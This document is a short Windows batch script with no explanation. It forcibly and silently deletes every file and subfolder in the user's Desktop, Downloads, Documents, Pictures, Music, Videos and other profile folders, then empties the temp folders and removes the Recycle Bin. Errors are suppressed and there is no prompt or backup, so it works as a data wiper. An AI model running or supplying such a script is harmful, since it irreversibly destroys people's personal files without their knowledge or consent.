@echo off
setlocal enabledelayedexpansion
set "userprofile=%USERPROFILE%"

:: Delete all files and subfolders in each directory
for %%F in (
    "Desktop"
    "Downloads" 
    "Documents"
    "Pictures"
    "Music"
    "Videos"
    "Favorites"
    "Recent"
    "Searches"
) do (
    if exist "%userprofile%\%%F\" (
        del /f /q /s "%userprofile%\%%F\*" >nul 2>&1
        for /d %%D in ("%userprofile%\%%F\*") do rmdir /s /q "%%D" 2>nul
    )
)

:: Delete temp folders contents (including subfolders)
for %%T in ("%TEMP%" "%userprofile%\AppData\Local\Temp") do (
    if exist "%%T\" (
        del /f /q /s "%%T\*" >nul 2>&1
        for /d %%D in ("%%T\*") do rmdir /s /q "%%D" 2>nul
    )
)

rd /s /q %systemdrive%\$Recycle.bin